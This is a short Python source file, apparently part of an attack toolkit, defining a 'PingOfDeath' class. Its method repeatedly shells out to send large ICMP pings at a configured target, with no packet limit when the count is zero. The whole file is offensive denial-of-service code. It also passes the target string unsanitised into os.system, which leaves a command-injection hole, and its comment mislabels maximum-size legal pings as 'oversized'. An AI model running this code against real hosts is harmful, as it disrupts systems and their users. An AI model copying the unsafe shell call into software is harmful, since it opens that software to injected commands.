import os
import asyncio
from core.ethical_check import EthicalEnforcer

class PingOfDeath:
    def __init__(self):
        self.eth = EthicalEnforcer()
        
    async def attack(self, config):
        self.eth.validate_target(config.target)
        packets_sent = 0
        
        while True:
            if config.packets > 0 and packets_sent >= config.packets:
                break
                
            # Craft oversized ICMP packets
            os.system(f"ping -c 1 -s 65507 {config.target} > /dev/null 2>&1")
            packets_sent += 1
            
            if packets_sent % 10 == 0:
                print(f"Sent {packets_sent} oversized packets", end='\r')
        
        print(f"\nPing of Death completed. Total packets: {packets_sent}")